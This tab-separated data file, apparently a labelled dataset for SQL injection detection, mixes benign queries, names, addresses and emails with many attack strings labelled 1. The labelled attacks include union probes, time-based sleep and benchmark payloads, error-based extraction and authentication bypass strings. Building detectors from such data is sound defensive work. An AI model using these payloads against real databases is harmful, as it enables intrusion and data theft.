Payload	Attacker
at89a7218	0
SELECT TOP 50 PERCENT * FROM position	0
"1""  )   as mibc where 3113  =  3113"	1
"  SELECT REPLACE ( ""XYZ FGH XYZ"", ""X"", ""m"" ) ;"	0
1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '	1
4.26048E+015	0
FROM  ( SELECT DISTINCT ancient FROM band ) 	0
SELECT * FROM ago 3 SELECT * FROM express	0
1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#	1
SELECT * FROM down WHERE child NOT LIKE '[question]%'	0
SELECT * FROM rose WHERE particles = 'gather'	0
"1""   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""xnsj"" like ""xnsj"	1
  SELECT mineID AS ID, all AS property FROM shore	0
1%' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and '%'  =  '	1
"1""  )   rlike sleep  (  5  )   and   (  ""rfsd""  =  ""rfsd"	1
"1""  )   where 8462  =  8462 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --"	1
select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--	1
1' and make_set  (  8403  =  8403,8899  )  	1
   SELECT COUNT ( report ) , throat FROM task BY speech	0
"1""   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and ""lxfm""  =  ""lxfm"	1
   SELECT support, our+ ', ' + political+ ' ' + fierce+ ', ' + shallow AS far  FROM again	0
SELECT COUNT ( top ) FROM model	0
-3339' or 8571  =  8571--	1
1   )    )    and   (  4169  =  9887  )  *9887 and    (    (   1137  =  1137	1
albuminmetro	0
1'   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --	1
1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz	1
"select pg_sleep  (  5  )   and    (    (     (  ""%""  =  """	1
SELECT solve FROM popular UNION SELECT find FROM helpful ORDER BY wheel	0
  SELECT saddleID AS ID, shelter AS shade FROM order	0
guasca	0
SELECT DISTINCT bare FROM fun	0
1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--	1
SELECT * FROM toy WHERE factor NOT LIKE '[mill]%'	0
ciro	0
printers	0
SELECT * FROM done WHERE center = 'forty'	0
1  )   union all select null,null--	1
9580	0
SELECT * FROM came WHERE green = 'quickly'  OR matter = 'deal'	0
1   )    )    as dhge where 4816  =  4816 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #	1
"1%""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""%""  =  """	1
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr	1
SELECT 'Supplier', ContactName, City, Country FROM Suppliers;	0
1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'drui' like 'drui	1
SELECT * FROM modern WHERE heavy NOT LIKE '[quarter]%'	0
c/ poetisa juana luna 135, 5-g	0
"-8005""  )   union all select 5213,5213,5213,5213,5213--"	1
beal	0
imtaz	0
INSERT INTO thy  ( open, even, stand )  VALUES  ( 'today', 'connected', 'above' )  	0
 UPDATE good SET trouble = 'relationship'WHERE electricity = 'excellent'	0
vinyals, 117 4?e	0
INSERT INTO herd ( softly, rising, storm, claws, bowl, merely )  VALUES  ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )  	0
8e6a74aer	0
  SELECT dropped AS right, common AS [accident]  FROM art	0
SELECT TOP 3 * FROM lift WHERE man = 'pleasure' SELECT * FROM even	0
entwistle_ruetting@comonuevo.ro	0
1'+  (  select 'gtqr' where 5660  =  5660	1
wakefiel7	0
1'   )    )    as wqhm where 9871  =  9871	1
zulmara	0
SELECT TOP 3 * FROM page WHERE chest = 'author'	0
SELECT MIN ( fighting )  AS send FROM automobile	0
1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
SELECT * FROM eat WHERE NOT hope = 'sugar'  AND NOT bone = 'grass'	0
aguacella	0
53933880f	0
rabascall	0
callejon giron 124,	0
  SELECT circus,properly FROM alive WHERE slowly = 'stopped' UNION SELECT hundred, children FROM sail	0
1%'  )   and 7533  =  7533 and   (  '%'  =  '	1
que3h5a	0
SELECT * FROM slightly WHERE mixture = 'she' LIMIT 3	0
torremocha del campo	0
SELECT TOP 3 * FROM thrown SELECT * FROM became 3SELECT * FROM little	0
1%'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '	1
1'+  (  select ukwc where 3008  =  3008 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #	1
sort	0
1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'tqpj'  =  'tqpj	1
1'+  (  select ijoh where 7145  =  7145 order by 1--	1
SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM lion	0
1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--	1
SELECT MIN ( piano )  AS across FROM copper	0
alfonso.julissa@naturalchild.tk	0
SELECT * FROM greatest WHERE tank = 'grow'  AND City = 'upper'	0
"1""   )    )    as bosq where 4695  =  4695"	1
SELECT COUNT ( DISTINCT waste )  FROM got	0
SELECT * FROM matter	0
22587	0
-8465' where 5242  =  5242 or 3806  =  7423--	1
 SELECT * FROM directly ORDER BY thousand ASC, told DESC	0
SELECT * FROM heading WHERE tie = 'nearer'	0
   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) 	0
   SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) 	0
SELECT AVG ( Price ) FROM deal	0
 select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1	1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""dqou"" like ""dqou"	1
SELECT AVG ( cow ) FROM born	0
SELECT * FROM people WHERE desk LIKE '%laid%'	0
41960	0
14140	0
acachorrar	0
1689	0
SELECT * FROM had 3 SELECT * FROM growth	0
1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
hsien	0
ayoroa	0
1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --	1
SELECT * FROM bag 3 SELECT * FROM except	0
gula	0
50	0
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   7805  =  7805	1
bjorn	0
jordi	0
admin'  )   or   (  '1'  =  '1	1
SELECT easily FROM even	0
7840270000000000	0
"1""  )   where 7578  =  7578 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --"	1
07194416q	0
"1""   )    )    as aozi where 3354  =  3354 waitfor delay '0:0:5'--"	1
DELETE FROM eager	0
"1"" where 1166  =  1166"	1
  SELECT * FROM somewhere WHERE joy IN  ( 'bank', 'neighborhood', 'circle' )  	0
"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#"	1
SELECT * FROM scientific WHERE year NOT BETWEEN 'where' AND 'yard'	0
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran	0
SELECT * FROM forward WHERE nation NOT BETWEEN 'tree' AND 'sudden'	0
DELETE FROM swept	0
1'   )    )    and 4595  =  4595#	1
SELECT * FROM citizen WHERE game NOT LIKE '[task]%'	0
adgardo	0
1%'   )    )     )   rlike sleep  (  5  )   and    (    (     (  '%'  =  '	1
SELECT * FROM first WHERE select NOT LIKE '[surrounded]%'	0
1   )    )    as wajy where 8593  =  8593	1
DELETE FROM weight	0
1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
56359685w	0
1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'amjh'  =  'amjh	1
1'+  (  select mumb where 4658  =  4658 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '	1
"1""   )    )    as zbfj where 2285  =  2285"	1
"1"" where 1203  =  1203 union all select null,null,null--"	1
masferr massans	0
SELECT COUNT ( darkness ) FROM outline	0
SELECT * FROM welcome WHERE NOT eat = 'family'  AND NOT prove = 'explanation'	0
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --"	1
"1%"" and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --"	1
INSERT INTO give  ( road, mighty, excellent )  VALUES  ( 'if', 'flow', 'everything' )  	0
SELECT * FROM origin WHERE bridge = 'sport'	0
1'  )   where 5540  =  5540 waitfor delay '0:0:5'--	1
SELECT * FROM bottom	0
SELECT TOP 3 * FROM airplane WHERE president = 'hollow' SELECT * FROM tube	0
"SELECT * FROM consonant WHERE grandfather BETWEEN ""living"" AND    ""against"""	0
1'   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi	1
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM tears WHERE which BETWEEN stiff09/01/1996report AND pride15/31/1996bare	0
-8893%'  )   union all select 1254,1254--	1
PRINT	1
1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT * FROM whose WHERE Price NOT BETWEEN 10 AND 20	0
leigh_hellinger@atorre.sy	0
1'+  (  select 'mikf' where 5814  =  5814 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '	1
"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#"	1
  SELECT * FROM tail WHERE wet IN  ( 'court', 'birth', 'image' )  	0
02624260y	0
SELECT TOP 3 * FROM drew	0
34886	0
   SELECT lungs, voice, broadFROM produce WHERE chamber  IS NOT NULL	0
insert	1
SELECT apart	0
sntoma	0
1'||  (  select 'ylio' from dual where 3767  =  3767 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'	1
1%'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '	1
1'  )   where 3703  =  3703 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
"-3747""  )   union all select 8962,8962,8962,8962,8962#"	1
linero-noro@cocheacoche.uy	0
3600000000000000	0
106705000000000	0
SELECT copy ( s )  FROM fastened LEFT JOIN	0
"1""   )    )    as ylah where 9248  =  9248"	1
SELECT represent ( s ) FROM ordinary INNER JOIN	0
1  )   where 6090  =  6090	1
   SELECT stuck, however, horse FROM church WHERE deep  IS NULL	0
farid	0
1 where 7224  =  7224 and sleep  (  5  )  #	1
  SELECT correctly,relationship,bus FROM throat LEFT JOIN Orders ON skill.chapterID =  minerals.cast ORDER BY police.women	0
1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226	1
SELECT COUNT ( driverID ) FROM north	0
"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb"	1
SELECT slight ( s ) FROM transportation INNER JOIN	0
SELECT AVG ( task ) FROM evening SELECT SUM ( heart ) 	0
SELECT railroad ( s )  FROM bar LEFT JOIN	0
 UPDATE wave SET load = 'speak'WHERE carry = 'probably'	0
-6412%' or 4065  =  5815 and '%'  =  '	1
SELECT COUNT ( DISTINCT letter )  FROM stock	0
reconfortante	0
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --"	1
SELECT * FROM beginning	0
SELECT COUNT ( author ) FROM bear	0
SELECT sell ( s )  FROM sunlight SELECT done FROM picture	0
SELECT * FROM year WHERE represent = 'natural'	0
  SELECT Orders.towerrID, Employees.them, Employees.its FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.exactlyID ORDER BY Orders.valleyID	0
SELECT * FROM position  WHERE electricity NOT LIKE '[pain]%'	0
chen-che	0
1'+  (  select 'kcix' where 1117  =  1117	1
doroteya	0
SELECT * FROM brave WHERE thread = 'fully' FETCH FIRST 3 ROWS ONLY	0
   SELECT piece,lunch,rush,information,part     (  (  definition JOIN value ON bad.silver =  plant.vegetable )   INNER JOIN sidesON Orders.wall =  vote.baseID ) 	0
"1""   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --"	1
89c3via	0
"waitfor delay '0:0:5' and   (  ""ludp"" like ""ludp"	1
   SELECT COUNT ( them ) , solid FROM card BY author	0
SELECT * FROM are  WHERE ice = managed	0
SELECT * FROM yourself WHERE degree = 'nest' LIMIT 3	0
1'+  (  select 'uqaf' where 7414  =  7414	1
  SELECT Orders.yourselfrID, Employees.hit, Employees.birthday FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.dutyID ORDER BY Orders.cabinID	0
1'  )   as scnn where 9274  =  9274	1
birney-warbeck@lamejorplaya.gl	0
"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--"	1
antulio	0
8a92rique46	0
1'  )   where 7908  =  7908 or sleep  (  5  )  --	1
1 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # ehsr	1
1'  )   where 1369  =  1369 and 4840  =  1697#	1
SELECT * FROM pool WHERE relationship  BETWEEN 10 AND 20	0
"1""  )   where 2388  =  2388 union all select null,null,null,null,null,null,null,null,null--"	1
1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT * FROM winter	0
1   )    )    as muyz where 6105  =  6105	1
-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--	1
1 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  	1
SELECT COUNT ( DISTINCT sport )  FROM full	0
minguez, 98	0
a6ordab07	0
SELECT AVG ( curve )  FROM cat  SELECT SUM ( read ) 	0
  UPDATE which SET tower =  'gone', City =  'record' WHERE gate =  hospital	0
madrid, 27	0
SELECT AVG ( eleven )  FROM seed  SELECT SUM ( nodded ) 	0
SELECT * FROM have WHERE Price NOT BETWEEN 10 AND 20	0
jochim@ajuntamentdebarcelona2-0.qa	0
SELECT * FROM numeral WHERE    NOT easier = 'buffalo'	0
 or 0  =  0 #	1
DELETE FROM interest	0
 SELECT column_name ( s )  FROM needed,ice	0
mascarino.marenghi@cocheacoche.lv	0
1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh	1
-8205' or elt  (  6581  =  3480,3480  )   and 'sosv'  =  'sosv	1
SELECT * FROM thought FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%'	0
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--"	1
SELECT * FROM sitting  WHERE cost NOT LIKE '[involved]%'	0
37130	0
1'||  (  select 'zifu' from dual where 4822  =  4822 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --	1
SELECT COUNT ( beside )  FROM lungs	0
"1""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""pdsy"" like ""pdsy"	1
SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLY	0
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv"	1
mohar@ropadegolf.gg	0
SELECT * FROM everyone FETCH FIRST 50 PERCENT ROWS ONLY	0
SELECT AVG ( kitchen ) FROM palace SELECT SUM ( darkness ) 	0
1'||  (  select 'fbsr' where 7899  =  7899 and elt  (  4249  =  4249,7259   )    )   ||'	1
chistiakov@zytechwind.ke	0
1'  )   order by 1--	1
select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --	1
SELECT large ( s FROM wagon RIGHT JOIN	0
1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--	1
 UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed'	0
SELECT * FROM outline  WHERE simplest NOT LIKE '[hill]%'	0
5642	0
SELECT COUNT ( spoken )  FROM explanation	0
SELECT naturally ( s )  FROM history UNION	0
pl. francisca pacheco, 81	0
select sleep  (  5  )   and   (  'hhlq' like 'hhlq	1
SELECT AVG ( shop ) FROM yes SELECT SUM ( front ) 	0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  ""eqmy""  =  ""eqmy"	1
32790960k	0
SELECT * FROM fought WHERE silent = 'shorter'  OR north = 'affect'	0
-4045 union all select 6857,6857,6857,6857,6857,6857,6857--	1
SELECT * FROM met ORDER BY but	0
 SELECT * FROM arrow ORDER BY mud ASC, past DESC	0
SELECT * FROM day WHERE out = 'function'	0
"1""  )   and sleep  (  5  )  #"	1
1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #	1
1'   )    )    as kfnt where 8090  =  8090 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --	1
juan de salcedo, 158 5?f	0
SELECT cut FROM surface	0
1'+  (  select 'epza' where 8994  =  8994 and make_set  (  3782  =  2428,2428   )    )   +'	1
  SELECT * FROM decide WHERE interior NOT IN  ( 'space', 'author', 'meal' )  	0
sierra bermeja s/n,	0
pi y margall 17, 7?f	0
1'   )    )    as rxhe where 3838  =  3838 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
SELECT MIN ( ring )  AS arrangement FROM tree	0
c/ jose belso castao, s/n,	0
SELECT * FROM tide WHERE there = 'built'  AND  ( colony = 'edge' OR equipment = 'owner' ) 	0
SELECT * FROM use ORDER BY crew DESC	0
1  )   where 6374  =  6374 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --	1
SELECT COUNT ( DISTINCT discover )  FROM chose	0
1'  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'ejnt' like 'ejnt	1
 select * from users where id  =  1 union select @ 1$,version  (    )   -- 1	1
1 where 4372  =  4372	1
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty"	1
1'  )   as zxos where 2745  =  2745	1
1i515s7d7d	0
pilapil@espaciopintor.my	0
1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu	1
"1%"" union all select null,null,null--"	1
SELECT material ( s )  FROM port SELECT automobile FROM almost	0
SELECT column_name FROM table_name WHERE column_name IN  (  value1 , value2 , ... ) ;	0
1   )    )    union all select null,null,null,null,null,null,null#	1
puerta del sol 124, 8?h	0
prado de la guzpea	0
redolat cardiel	0
   SELECT colony, tonight+ ', ' + effect+ ' ' + almost+ ', ' + salt AS led  FROM most	0
1'   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'fvov'  =  'fvov	1
SELECT lot ( s )  FROM escape	0
admin'  )   or '1'  =  '1'--	1
413f1go	0
massimil	0
1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud	1
DELETE FROM at	0
1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '	1
"1""  )   union all select null,null,null,null,null,null,null,null--"	1
serratosa@yiutuve.pe	0
banderizar	0
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY	0
tehchi8	0
13021468h	0
4014	0
raphael	0
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""tzqk"" like ""tzqk"	1
SELECT * FROM can ORDER BY most DESC	0
7x	0
-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#	1
SELECT * FROM heat 3 SELECT * FROM whenever	0
-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#	1
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
armstrong@viajesnacionales.pn	0
47939000p	0
gabriela1	0
1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +'	1
31049	0
 select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'	1
 select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1	1
1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
vencilln	0
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +'	1
INSERT INTO nice ( plan, soft, paint, continent, appearance, handsome )  VALUES  ( 'sink', 'win'. ask', 'twice', 'importance', 'foreign', 'in' )  	0
1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'beju' like 'beju	1
-4699  )   as mymz where 3405  =  3405 or elt  (  1032  =  1032,3623  )  --	1
1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'mnod'  =  'mnod	1
1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'xikz' like 'xikz	1
uhlhorn	0
 select * from users where id  =  1 union select @ $_,version  (    )   -- 1	1
talavera panfili	0
jande	0
   SELECT COUNT ( heard ) , floating FROM harder BY difficult	0
 UPDATE instant SET slowly = 'sometime'WHERE positive = 'care'	0
select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'zaru'  =  'zaru	1
1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --	1
cervera del ro alhama	0
"-5826""   )    )    union all select 7192,7192#"	1
